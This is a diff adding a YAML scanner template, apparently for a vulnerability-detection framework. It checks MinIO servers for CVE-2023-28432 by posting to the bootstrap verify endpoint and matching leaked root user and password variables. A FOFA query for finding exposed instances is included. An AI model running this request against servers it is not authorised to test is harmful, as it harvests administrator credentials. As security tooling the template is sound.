@@ -1,0 +1,18 @@
+id: poc-yaml-minio-information-disclosure
+info:
+  name: MinIO 信息泄露(CVE-2023-28432)
+  severity: high
+  tags:
+  - CVE-2023-28432
+  - 两高一弱
+  finger: minio
+fofa: app="Minio"
+requests:
+- method: POST
+  path: /minio/bootstrap/v1/verify
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  expression: status_code == 200 && contains(body, "\"MINIO_ROOT_PASSWORD\":") &&
+    contains(body, "MINIO_ROOT_USER") && contains(body, "MinioEnv")
+variables: {}
+transport: http
